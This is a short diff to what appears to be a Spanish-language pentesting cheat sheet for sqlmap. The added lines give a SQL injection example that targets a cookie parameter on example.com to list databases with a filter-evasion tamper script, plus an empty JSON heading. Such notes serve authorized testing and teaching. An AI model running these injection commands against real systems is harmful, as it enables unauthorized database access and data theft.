@@ -22,6 +22,12 @@
 ```bash
 sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln --dbs --tamper=space2comment
 ```
+```bash
+#Cookie
+sqlmap -u "http://example.com/index.php" -v 3 --cookie "id=*" --dbs --tamper=space2comment
+#JSON
+
+```
 ### Tabla
 - Devuelve las tablas de una DB específica
 ```bash
